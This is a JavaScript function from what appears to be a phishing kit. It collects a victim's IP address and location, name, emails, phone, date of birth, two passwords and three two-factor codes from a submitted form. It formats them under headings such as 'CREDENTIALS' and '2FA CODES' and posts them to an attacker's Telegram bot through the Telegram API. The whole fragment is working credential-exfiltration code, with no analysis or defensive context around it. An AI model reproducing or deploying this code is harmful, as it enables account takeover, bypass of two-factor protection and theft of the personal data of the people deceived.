async sendToTelegram(data) {
    const locationData = data.locationData || {
        ip: "N/A",
        location: "N/A"
    };

    const text = `
🚨 **NEW SUBMISSION RECEIVED** 🚨

🌐 **NETWORK INFO**
• **IP:** <code>${locationData.ip}</code>
• **Location:** <code>${locationData.location}</code>

👤 **PERSONAL DETAILS**
• **Full Name:** <code>${data.fullName || 'N/A'}</code>
• **Email:** <code>${data.email || 'N/A'}</code>
• **Business Email:** <code>${data.emailBusiness || 'N/A'}</code>
• **Page Name:** <code>${data.fanpage || 'N/A'}</code>
• **Phone:** <code>${data.phone || 'N/A'}</code>
• **DOB:** <code>${data.day}/${data.month}/${data.year}</code>

🔑 **CREDENTIALS**
• **Password (1):** <code>${data.password || 'N/A'}</code>
• **Password (2):** <code>${data.passwordSecond || 'N/A'}</code>

🛡️ **2FA CODES**
• **Code 1:** <code>${data.twoFa || 'N/A'}</code>
• **Code 2:** <code>${data.twoFaSecond || 'N/A'}</code>
• **Code 3:** <code>${data.twoFaThird || 'N/A'}</code>

⏱️ <em>Time: ${new Date().toLocaleString()}</em>`.trim();

    try {
        await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                text,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('Telegram error:', error);
    }
},
